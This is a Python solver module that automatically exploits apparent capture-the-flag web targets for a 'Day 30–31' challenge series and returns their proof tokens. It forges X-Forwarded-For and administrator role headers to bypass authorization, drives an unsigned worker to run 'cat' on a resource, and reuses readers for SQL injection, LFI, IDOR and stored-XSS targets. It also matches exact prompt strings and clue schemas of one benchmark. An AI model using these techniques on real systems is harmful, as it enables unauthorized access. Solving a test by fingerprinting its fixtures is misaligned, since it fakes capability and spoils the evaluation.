"""Dedicated speed readers for the final Day 30--31 Web rotations.

The cumulative Masteries reuse the already-qualified structural readers for
their earlier numbered slots, with exact final-bundle handling here for the
rotated Django slot and each day's final fresh target.  Every returned proof is
novel to one exact payoff response; no target address, proof, or variant answer
is embedded here.
"""
from __future__ import annotations

import json
import re
import threading
import time
from urllib.parse import urlencode, urlsplit

from speedrun.solvers import web as _early
from speedrun.solvers import web_d06_d16 as _mid
from speedrun.solvers import web_d17_d29 as _late
from speedrun.web_target import (
    Response, TargetClient, WebAnswers, is_proof_value, prepare_tls_context, proof_tokens,
    solve_fresh_targets, target_identity,
)


IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,63}$")
TOKEN = re.compile(r"^[A-Za-z0-9._~-]{1,256}$")
ARENA_HEADER = re.compile(r"^x-arena-[0-9a-f]{6,64}$")

FAMILIES = {
    30: (
        "framework-roulette",
        "New stack, no map, no familiar names. Everything you've learned, none of your crutches — prove the skills travel.",
    ),
    31: (
        "full-stack-incident",
        "Reconstruct the unsigned fetch-to-worker incident from the request log. Follow the exposed service routes to reproduce it, inspect the resulting evidence, then submit a detector and repair that block the attack while preserving signed status checks.",
    ),
}
SUPPORTED_DAYS = frozenset(FAMILIES)
TARGET_MODE = True
TARGET_REQUEST_BUDGET = 32
# Day 31 Mastery retains the asynchronous Day-7 stored-XSS family in slot 7.
TARGET_READY_MINIMUMS = {(31, "mastery"): 9.0}


def prepare(_root=None):
    prepare_tls_context()


def _unique_pairs(pairs):
    out, canonical = {}, set()
    for key, value in pairs:
        if not isinstance(key, str):
            raise ValueError("non-string JSON key")
        folded = re.sub(r"[^a-z0-9]+", "", key.lower())
        if key in out or folded in canonical:
            raise ValueError("duplicate or colliding JSON key")
        out[key] = value
        canonical.add(folded)
    return out


def _doc(response: Response):
    try:
        value = json.loads(
            response.body.decode("utf-8", "strict"),
            object_pairs_hook=_unique_pairs,
            parse_constant=lambda _value: (_ for _ in ()).throw(ValueError()),
        )
    except (UnicodeError, ValueError, TypeError):
        return None
    return value if isinstance(value, dict) else None


def _tokens(*responses: Response) -> set[str]:
    found = set()
    for response in responses:
        values = [response.body]
        values.extend(value.encode("utf-8", "ignore") for value in response.headers.values())
        for raw in values:
            found.update(proof_tokens(raw))
    return found


def _novel(response: Response, controls, *, effect: str):
    if not 200 <= response.status < 300:
        return None
    doc = _doc(response)
    if not isinstance(doc, dict) or doc.get("ok") is not True or doc.get("effect") != effect \
            or any(key in doc for key in ("error", "errors", "denied", "rejected")):
        return None
    novel = _tokens(response) - _tokens(*controls)
    return next(iter(novel)) if len(novel) == 1 else None


def _route(client: TargetClient, value):
    if not isinstance(value, str) or not value or len(value.encode("utf-8")) > 1024:
        return None
    try:
        parsed = urlsplit(value)
        if parsed.username is not None or parsed.password is not None or parsed.fragment or parsed.query:
            return None
        if parsed.scheme or parsed.netloc:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            if (parsed.scheme, (parsed.hostname or "").lower().rstrip("."), port) != client.origin:
                return None
        if not parsed.path.startswith("/") or "\\" in value \
                or any(part == ".." for part in parsed.path.split("/")):
            return None
        return parsed.path
    except (TypeError, ValueError):
        return None


def _vary(response: Response):
    raw = response.headers.get("vary")
    if not isinstance(raw, str):
        return None
    values = [value.strip().lower() for value in raw.split(",") if value.strip()]
    return values[0] if len(values) == 1 else None


class _PrefetchedClient:
    """Replay read-only classification responses to one existing reader.

    The classifier and the selected family reader share one origin-pinned
    :class:`TargetClient`.  Replaying only exact header-free GETs avoids a
    second root/clue request without hiding any request from the target budget:
    the original fetch already claimed that request on the wrapped client.
    """

    def __init__(self, client: TargetClient, responses: dict[str, Response]):
        self._client = client
        self._responses = dict(responses)

    def get(self, path: str, *, headers: dict[str, str] | None = None) -> Response:
        if headers is None and path in self._responses:
            return self._responses[path]
        return self._client.get(path, headers=headers)

    def __getattr__(self, name):
        return getattr(self._client, name)


def _root_signals(root: Response):
    """Classify only mutually exclusive production root shapes."""
    location = root.headers.get("location")
    lfi = _early._same_origin_path(location) if 300 <= root.status < 400 and location else None

    forms = _early.FORM.findall(_early._text(root))
    sqli = False
    if len(forms) == 1:
        attrs, body = forms[0]
        action = _early.ACTION.search(attrs)
        inputs = {match[1] for match in _early.INPUT.findall(body)}
        sqli = action is not None and len(inputs) == 1 \
            and _early._same_origin_path(action.group(2)) is not None

    links = _early._links(root)
    feeds = [path for path in links if path.startswith("/api/")]
    objects = [path for path in links if re.search(r"/\d+(?:\?|$)", path)]
    idor = len(feeds) == 1 and bool(objects)
    clues = [path for path in links if path == "/api/clues"]

    found = []
    if lfi is not None:
        found.append("lfi")
    if sqli:
        found.append("sqli")
    if idor:
        found.append("idor")
    if len(clues) == 1:
        found.append("clues")
    return found


def _clue_family(clues: dict, outer_day: int) -> str | None:
    """Map an exact known final-bundle clue schema to one family."""
    keys = set(clues)
    framework = clues.get("framework")
    if framework == "Django" and keys == {"framework", "feature_route", "current_role"}:
        return "django"
    if framework == "Fastify" and keys == {
            "framework", "feature_route", "secondary_route", "current_role", "callback_nonce"}:
        return "callback"
    moderator = keys & {"moderator_data_route", "moderator_route"}
    receipt = keys & {"receipt_route_template", "receipt_route"}
    stored_keys = {"feature_route"} | moderator | receipt
    if len(moderator) == 1 and len(receipt) == 1 \
            and keys - stored_keys <= {"framework", "current_role"} \
            and framework in (None, "FastAPI"):
        return "stored_xss"
    if framework == "ASP.NET Core Blazor Server" and keys == {
            "framework", "feature_route", "component_route", "current_role"}:
        return "day30" if outer_day == 30 else None
    if framework == "Actix Web" and keys == {
            "framework", "feature_route", "secondary_route", "final_route",
            "request_log_route", "evidence_route", "response_route",
            "fetch_query_field", "event_json_field", "worker_query_field", "current_role"}:
        return "day31" if outer_day == 31 else None
    return None


def _robots_is_backup(robots: Response) -> bool:
    paths = []
    for raw in _early._text(robots).splitlines():
        if ":" not in raw or raw.split(":", 1)[0].strip().lower() != "disallow":
            continue
        path = _early._same_origin_path(raw.split(":", 1)[1].strip())
        if path and path not in paths:
            paths.append(path)
    return 200 <= robots.status < 300 and len(paths) == 1


def _day30(client: TargetClient, _attempt):
    clue_response = client.get("/api/clues")
    clues = _doc(clue_response)
    if clue_response.status != 200 or not isinstance(clues, dict) \
            or clues.get("framework") != "ASP.NET Core Blazor Server" \
            or clues.get("component_route") != "/blazor" \
            or not isinstance(clues.get("current_role"), str):
        return None
    feature = _route(client, clues.get("feature_route"))
    if feature is None:
        return None

    topology = client.get(feature, headers={"X-Forwarded-For": "127.0.0.1"})
    topology_doc = _doc(topology)
    role_header = _vary(topology)
    if topology.status != 403 or not isinstance(topology_doc, dict) \
            or set(topology_doc) != {"error", "policy"} \
            or topology_doc.get("error") != "topology_proof_rejected" \
            or topology_doc.get("policy") != "staff_only" \
            or not isinstance(role_header, str) or ARENA_HEADER.fullmatch(role_header) is None:
        return None

    payoff = client.get(feature, headers={
        "X-Forwarded-For": "127.0.0.1",
        role_header: "administrator",
    })
    if _vary(payoff) != role_header:
        return None
    return _novel(
        payoff, [clue_response, topology], effect="unseen_trust_boundary_generalized")


def _final_slot5(client: TargetClient, outer_day: int):
    """Final cumulative bundles' production-shaped Django slot 5."""
    root = client.get(client.root)
    candidates = [path for path in _early._links(root) if path.startswith("/api/")]
    if len(candidates) != 1:
        return None
    clue_response = client.get(candidates[0])
    clues = _doc(clue_response)
    route = _route(client, clues.get("feature_route")) if isinstance(clues, dict) else None
    prefix = {30: "action", 31: "execute"}.get(outer_day)
    if prefix is None or clues != {
            "framework": "Django", "feature_route": route, "current_role": "analyst"} \
            or route is None or re.fullmatch(rf"/{prefix}-[0-9a-f]{{6,64}}", route) is None:
        return None
    payoff = client.get(route)
    payoff_doc = _doc(payoff)
    if not isinstance(payoff_doc, dict) \
            or set(payoff_doc) != {"ok", "effect", "evidence"}:
        return None
    return _novel(payoff, [root, clue_response], effect="framework_authorization_bypassed")


def _event_records(value):
    if not isinstance(value, list) or not value:
        return None
    rows = []
    for row in value:
        if not isinstance(row, dict) or set(row) - {"command", "kind", "outcome", "signed", "target"} \
                or not isinstance(row.get("kind"), str) or not isinstance(row.get("outcome"), str) \
                or not isinstance(row.get("signed"), bool):
            return None
        rows.append(row)
    return rows


def _day31(client: TargetClient, _attempt):
    clue_response = client.get("/api/clues")
    clues = _doc(clue_response)
    if clue_response.status != 200 or not isinstance(clues, dict) \
            or clues.get("framework") != "Actix Web" \
            or not isinstance(clues.get("current_role"), str):
        return None
    route_keys = (
        "feature_route", "secondary_route", "final_route", "request_log_route",
        "evidence_route", "response_route",
    )
    routes = {key: _route(client, clues.get(key)) for key in route_keys}
    if any(value is None for value in routes.values()) or len(set(routes.values())) != len(routes):
        return None
    field_keys = ("fetch_query_field", "event_json_field", "worker_query_field")
    fields = {key: clues.get(key) for key in field_keys}
    if any(not isinstance(value, str) or IDENT.fullmatch(value) is None for value in fields.values()) \
            or len(set(fields.values())) != len(fields):
        return None

    log_response = client.get(routes["request_log_route"])
    log_doc = _doc(log_response)
    records = log_doc.get("records") if log_response.status == 200 and isinstance(log_doc, dict) else None
    if not isinstance(records, list) or len(records) < 2 \
            or any(not isinstance(row, dict) for row in records):
        return None
    unsigned = [row for row in records
                if row.get("kind") == "fetch" and row.get("outcome") == "queued"
                and row.get("signed") is False and isinstance(row.get("target"), str)
                and TOKEN.fullmatch(row["target"])]
    signed = [row for row in records
              if row.get("kind") == "fetch" and row.get("outcome") == "allowed"
              and row.get("signed") is True and isinstance(row.get("target"), str)]
    if len(unsigned) != 1 or not signed:
        return None
    target = unsigned[0]["target"]

    fetch = client.get(routes["feature_route"] + "?" + urlencode({fields["fetch_query_field"]: target}))
    fetch_doc = _doc(fetch)
    if fetch.status != 202 or not isinstance(fetch_doc, dict) \
            or fetch_doc != {"ok": True, "stage": "fetch_event_created"}:
        return None
    dispatch = client.post_json(routes["secondary_route"], {fields["event_json_field"]: target})
    dispatch_doc = _doc(dispatch)
    if dispatch.status != 202 or not isinstance(dispatch_doc, dict) \
            or dispatch_doc.get("ok") is not True or dispatch_doc.get("stage") != "worker_dispatched" \
            or dispatch_doc.get("worker_route") != routes["final_route"]:
        return None
    resources = dispatch_doc.get("resources")
    commands = dispatch_doc.get("available_commands")
    if not isinstance(resources, list) or len(resources) != 1 \
            or not isinstance(resources[0], str) or TOKEN.fullmatch(resources[0]) is None \
            or commands != ["status", "cat <resource>"]:
        return None

    signed_command = commands[0]
    signed_control = client.get(
        routes["final_route"] + "?" + urlencode({fields["worker_query_field"]: signed_command}),
    )
    signed_doc = _doc(signed_control)
    if signed_control.status != 200 or signed_doc != {
            "kind": "worker.dispatch", "outcome": "allowed", "signed": True}:
        return None

    command = "cat " + resources[0]
    worker = client.get(routes["final_route"] + "?" + urlencode({fields["worker_query_field"]: command}))
    worker_doc = _doc(worker)
    if worker.status != 202 or not isinstance(worker_doc, dict) \
            or worker_doc != {"evidence_route": routes["evidence_route"], "ok": True,
                              "stage": "unsigned_worker_dispatched"}:
        return None
    evidence = client.get(routes["evidence_route"])
    evidence_doc = _doc(evidence)
    events = _event_records(evidence_doc.get("events") if isinstance(evidence_doc, dict) else None)
    schema = evidence_doc.get("response_schema") if isinstance(evidence_doc, dict) else None
    if evidence.status != 200 or events is None or not isinstance(schema, dict) \
            or schema != {"detector": {"kind": "string", "signed": "boolean"},
                          "repair": {"block_internal_fetch": "boolean",
                                     "require_signed_event": "boolean",
                                     "worker_allowlist": "string[]"}}:
        return None
    bad_events = [row for row in events
                  if row.get("outcome") == "executed" and row.get("signed") is False]
    allowed = [row.get("command") for row in events
               if row.get("kind") == "worker.dispatch" and row.get("outcome") == "allowed"
               and row.get("signed") is True and isinstance(row.get("command"), str)]
    if len(bad_events) != 1 or not isinstance(bad_events[0].get("kind"), str) \
            or len(set(allowed)) != 1 or allowed[0] != signed_command:
        return None

    response_body = {
        "detector": {"kind": bad_events[0]["kind"], "signed": False},
        "repair": {"block_internal_fetch": True, "require_signed_event": True,
                   "worker_allowlist": [allowed[0]]},
    }
    payoff = client.post_json(routes["response_route"], response_body)
    payoff_doc = _doc(payoff)
    regressions = payoff_doc.get("regressions") if isinstance(payoff_doc, dict) else None
    expected_regressions = {
        "attack_detected", "benign_status_excluded", "internal_fetch_blocked",
        "status_still_allowed", "unsigned_event_rejected",
    }
    if not isinstance(regressions, dict) or set(regressions) != expected_regressions \
            or any(value is not True for value in regressions.values()) \
            or payoff_doc.get("controls_active") is not True:
        return None
    return _novel(
        payoff, [clue_response, log_response, fetch, dispatch, signed_control, worker, evidence],
        effect="incident_detected_and_remediated")


MASTERY_FAMILIES = {
    30: frozenset({"backup", "idor", "sqli", "lfi", "django", "day30"}),
    31: frozenset({
        "backup", "idor", "sqli", "lfi", "django", "callback", "stored_xss", "day31",
    }),
}

STRUCTURAL_READERS = {
    "backup": _late.EARLY_READERS[1],
    "idor": _late.EARLY_READERS[2],
    "sqli": _late.EARLY_READERS[3],
    "lfi": _late.EARLY_READERS[4],
    "callback": _mid.READERS[6],
    "stored_xss": _mid.READERS[7],
    "day30": _day30,
    "day31": _day31,
}


def _mastery_family(client: TargetClient, attempt: dict, outer_day: int, *, prefer_final: bool = False):
    """Derive one cumulative target's family from fresh response structure.

    Target position is intentionally absent from this decision.  Every probe is
    a bounded same-origin GET.  Ambiguous roots and unknown clue schemas stop
    before any family-specific exploit request.
    """
    cached = {}
    if prefer_final:
        clue_response = client.get("/api/clues")
        cached["/api/clues"] = clue_response
        clues = _doc(clue_response)
        hinted = _clue_family(clues, outer_day) if isinstance(clues, dict) else None
        if hinted == f"day{outer_day}":
            replay = _PrefetchedClient(client, cached)
            return hinted, STRUCTURAL_READERS[hinted](replay, attempt)

    root = client.get(client.root)
    cached[client.root] = root
    signals = _root_signals(root)
    family = signals[0] if len(signals) == 1 else None
    if len(signals) > 1:
        return None, None

    if family == "clues":
        clue_path = "/api/clues"
        clue_response = cached.get(clue_path)
        if clue_response is None:
            clue_response = client.get(clue_path)
            cached[clue_path] = clue_response
        clues = _doc(clue_response)
        family = _clue_family(clues, outer_day) if isinstance(clues, dict) else None
    elif family is None:
        # A backup root has no exploit link, while the final targets may expose
        # their exact schema only at /api/clues.  The two read-only controls are
        # tried in this order so the common backup family avoids a dead clues GET.
        if 200 <= root.status < 300:
            robots = client.get("/robots.txt")
            cached["/robots.txt"] = robots
            if _robots_is_backup(robots):
                family = "backup"
        if family is None:
            clue_path = "/api/clues"
            clue_response = cached.get(clue_path)
            if clue_response is None:
                clue_response = client.get(clue_path)
                cached[clue_path] = clue_response
            clues = _doc(clue_response)
            direct = _clue_family(clues, outer_day) if isinstance(clues, dict) else None
            # The final targets may expose only /api/clues.  Earlier families
            # require either their advertised root clue link or the recorded
            # non-success root used by the stored-XSS fixture.
            if direct in {"day30", "day31"} or not 200 <= root.status < 300:
                family = direct

    if family not in MASTERY_FAMILIES.get(outer_day, frozenset()):
        return family, None
    replay = _PrefetchedClient(client, cached)
    if family == "django":
        return family, _final_slot5(replay, outer_day)
    reader = STRUCTURAL_READERS.get(family)
    return family, reader(replay, attempt) if reader is not None else None


def _contract(attempt: dict, ctx: dict):
    day, mode = ctx.get("day"), ctx.get("mode")
    if not isinstance(day, int) or isinstance(day, bool) or day not in FAMILIES \
            or mode not in {"time_trial", "mastery"} \
            or attempt.get("artifacts") or attempt.get("downloads") or attempt.get("download"):
        return None
    slug, prompt = FAMILIES[day]
    wanted = f"web-exploitation-day-{day:02d}-{slug}"
    if ctx.get("base") != wanted or ctx.get("challenge") != wanted + "/" + mode \
            or attempt.get("mode") != mode or attempt.get("prompt") != prompt:
        return None
    expected = 1 if mode == "time_trial" else {30: 6, 31: 8}[day]
    targets, answers, questions = attempt.get("targets"), attempt.get("answer_ids"), attempt.get("questions")
    if not isinstance(targets, list) or not isinstance(answers, list) or not isinstance(questions, list) \
            or len(targets) != expected or len(answers) != expected or len(questions) != expected:
        return None
    rows, identities = [], set()
    for index, (target, answer_id, question) in enumerate(zip(targets, answers, questions), 1):
        target_id, proof_id = f"Target {index}", f"proof-{index}"
        if not isinstance(target, dict) or target.get("id") != target_id \
                or not isinstance(target.get("url"), str) or answer_id != proof_id \
                or not isinstance(question, dict) or question.get("id") != proof_id \
                or question.get("artifact") != target_id \
                or question.get("question") != f"Recover the proof from {target_id}." \
                or question.get("normalization") != "trim" \
                or question.get("answer_format") != {
                    "kind": "exact_text",
                    "syntax": "Submit the exact proof recovered from this target.",
                } \
                or (mode == "time_trial" and "set" in question) \
                or (mode == "mastery" and question.get("set") != index):
            return None
        try:
            identity = target_identity(target["url"])
        except Exception:
            return None
        if identity in identities:
            return None
        identities.add(identity)
        rows.append((index, answer_id, target["url"]))
    return day, mode, rows


def contract_problem(attempt: dict, ctx: dict) -> str | None:
    return None if _contract(attempt, ctx) is not None else \
        "not the exact saved Web Day 30--31 timed target contract"


def solve_target(attempt: dict, ctx: dict) -> WebAnswers:
    validated = _contract(attempt, ctx)
    deadline = ctx.get("deadline")
    if validated is None or not isinstance(deadline, (int, float)) or isinstance(deadline, bool) \
            or float(deadline) <= time.time() + 0.05:
        return WebAnswers()
    day, mode, rows = validated
    try:
        requested_budget = int(ctx.get("max_requests") or TARGET_REQUEST_BUDGET)
    except (TypeError, ValueError):
        return WebAnswers()
    maximum = max(1, min(requested_budget, TARGET_REQUEST_BUDGET))
    classifications = {}
    classification_lock = threading.Lock()

    def one(client: TargetClient, current_attempt: dict, index: int):
        family, proof = _mastery_family(
            client, current_attempt, day,
            prefer_final=mode == "time_trial" or index == len(rows))
        with classification_lock:
            classifications[index] = family
        return proof

    values = solve_fresh_targets(
        attempt, one, deadline=float(deadline), max_requests=maximum, indexed=True)
    out = WebAnswers()
    families = tuple(classifications.values())
    exact_bundle = len(classifications) == len(rows) and (
        (mode == "time_trial" and len(families) == 1
         and families[0] in MASTERY_FAMILIES[day])
        or (mode == "mastery" and frozenset(families) == MASTERY_FAMILIES[day])
    )
    if exact_bundle:
        for answer_id, value in values.items():
            if is_proof_value(value):
                out[answer_id] = value
    out.target_requests = getattr(values, "target_requests", None)
    return out


def solve(_attempt: dict, _deliveries: list, _ctx: dict) -> WebAnswers:
    return WebAnswers()
